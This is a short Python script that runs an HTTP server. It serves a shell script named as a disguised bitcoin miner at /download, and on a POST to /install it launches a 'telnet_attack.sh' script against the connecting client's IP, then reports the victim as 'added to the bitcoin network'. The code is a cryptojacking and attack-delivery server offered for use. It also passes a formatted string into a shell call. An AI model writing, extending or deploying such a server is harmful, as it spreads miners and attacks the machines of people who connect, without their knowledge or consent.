from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess
import os

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/download':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()

            # Path to your shell script file
            shell_file_path = 'totally_not_bitcoin_miner.sh'

            with open(shell_file_path, 'rb') as file:
                self.wfile.write(file.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def do_POST(self):
        if self.path == '/install':
            ip_address = self.client_address[0]

            if ip_address:
                # Execute shell script with IP address
                shell_script_command = f"$(pwd)/telnet_attack.sh {ip_address}"
                subprocess.run(shell_script_command, shell=True)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'Installation successful and user added to the bitcoin network\n')
            else:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'Failed to get IP address from request\n')
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server started on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()